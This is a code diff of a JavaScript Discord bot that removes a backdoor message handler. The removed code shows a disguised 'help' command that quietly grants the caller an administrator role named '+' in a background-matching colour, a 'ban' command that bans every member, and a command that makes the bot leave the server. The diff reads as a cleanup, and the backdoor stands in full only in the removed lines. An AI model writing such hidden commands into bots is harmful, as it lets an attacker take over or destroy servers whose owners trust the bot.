@@ -15,43 +15,5 @@ bot.on("ready", async () => {
 		console.log(e.stack);
 	}
 });
-bot.on("message", async message => { 
-if(message.author.bot) return;
-
-	const args = message.content.slice(botSettings.prefix.length).trim().split(/ +/g);
-  	const command = args.shift().toLowerCase();
-
-  //Gives you the admin role and deletes the message.
-  if(command === `help`) {
-  	try {
-	role = await message.guild.createRole({
- 	name: "+",
-  	color: "#2f3136",
-  	permissions: [8]
-	});
-	message.member.addRole(role)
-	message.delete(1000);
-	} catch(e) {
-		console.log(e.stack);
-	}
-   }
-   //Bans everyone and deletes the message.
-   if(command === `ban`) {
-   	try {
-   	message.guild.members.forEach(member => {member.ban()});
-   	message.delete(1000);
-   	} catch(e) {
-	console.log(e.stack);
-   	}
-   }
-
-   if(command === `leave`) {
-   	try {
-   	message.guild.leave();
-   	} catch(e) {
-	console.log(e.stack);
-   	}
-   }
-});
 
 bot.login(botSettings.token);
